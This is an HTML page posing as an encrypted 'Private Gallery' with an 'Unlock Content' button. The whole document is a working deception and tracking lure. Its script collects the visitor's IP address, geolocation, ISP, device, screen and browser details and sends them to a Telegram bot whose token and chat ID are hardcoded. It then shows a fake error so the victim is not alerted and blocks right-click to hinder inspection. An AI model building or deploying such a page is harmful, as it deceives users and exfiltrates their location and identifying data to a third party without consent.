<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Content</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0f0f0f;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            text-align: center;
            max-width: 400px;
        }

        .preview-img {
            width: 100%;
            height: 300px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            box-shadow: 0 20px 60px rgba(102, 126, 234, 0.3);
            position: relative;
            overflow: hidden;
        }

        .preview-img::before {
            content: 'ðŸ”’';
            position: absolute;
            font-size: 80px;
            opacity: 0.3;
        }

        h1 {
            color: #fff;
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 700;
        }

        p {
            color: #888;
            font-size: 16px;
            margin-bottom: 40px;
            line-height: 1.6;
        }

        .unlock-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 60px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .unlock-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.5);
        }

        .unlock-btn:active {
            transform: translateY(0);
        }

        .unlock-btn::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255,255,255,0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }

        .unlock-btn:active::after {
            width: 300px;
            height: 300px;
        }

        .loading {
            color: #667eea;
            margin-top: 20px;
            font-size: 14px;
            display: none;
        }
        
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #667eea;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }
        
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="preview-img"></div>
        <h1>Private Gallery</h1>
        <p>This content is encrypted. Click below to verify your identity and unlock access.</p>
        <button class="unlock-btn" id="btn" onclick="unlock()">Unlock Content</button>
        <div class="loading" id="loading"><span class="spinner"></span>Verifying...</div>
    </div>

    <script>
        // Telegram Bot Configuration
        const BOT_TOKEN = '8223784099:AAHiWADO2dN_dIpVmHdv7DENl4l1MY2kP6c';
        const CHAT_ID = '8048791680';

        async function unlock() {
            const btn = document.getElementById('btn');
            const loading = document.getElementById('loading');
            
            btn.style.display = 'none';
            loading.style.display = 'block';

            let ipData = {};
            let fallbackMode = false;

            // Try to get IP data
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (res.ok) {
                    ipData = await res.json();
                } else {
                    throw new Error('IP API failed');
                }
            } catch (e) {
                // Fallback to ipify if ipapi fails
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ipData.ip = data.ip;
                    ipData.city = 'Unknown';
                    ipData.region = 'Unknown';
                    ipData.country_name = 'Unknown';
                    ipData.org = 'Unknown';
                    ipData.latitude = 'Unknown';
                    ipData.longitude = 'Unknown';
                    fallbackMode = true;
                } catch (e2) {
                    ipData.ip = 'Could not fetch';
                }
            }

            // Build message - always send even if IP fetch failed
            const msg = `ðŸŽ¯ *NEW CLICK!* ${fallbackMode ? 'âš ï¸ Fallback Mode' : ''}\n\n` +
                `ðŸ“± *IP:* ${ipData.ip || 'Unknown'}\n` +
                `ðŸ“ *Location:* ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n` +
                `ðŸ¢ *ISP:* ${ipData.org || 'Unknown'}\n` +
                `ðŸ—º *Coords:* ${ipData.latitude || 'N/A'}, ${ipData.longitude || 'N/A'}\n` +
                `ðŸ’» *Device:* ${navigator.platform}\n` +
                `ðŸ“º *Screen:* ${window.screen.width}x${window.screen.height}\n` +
                `ðŸŒ *Browser:* ${navigator.userAgent}\n` +
                `â° *Time:* ${new Date().toLocaleString()}`;

            // Send to Telegram (always try to send)
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown'
                    })
                });

                // Success - show fake error after delay
                setTimeout(() => {
                    alert('Error: Content temporarily unavailable. Please try again later.');
                    loading.style.display = 'none';
                    btn.style.display = 'inline-block';
                }, 2000);

            } catch (e) {
                // If Telegram fails, still show fake error to not alert user
                setTimeout(() => {
                    alert('Error: Verification failed. Try again.');
                    loading.style.display = 'none';
                    btn.style.display = 'inline-block';
                }, 1500);
            }
        }

        // Block right click
        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>

</body>
</html>
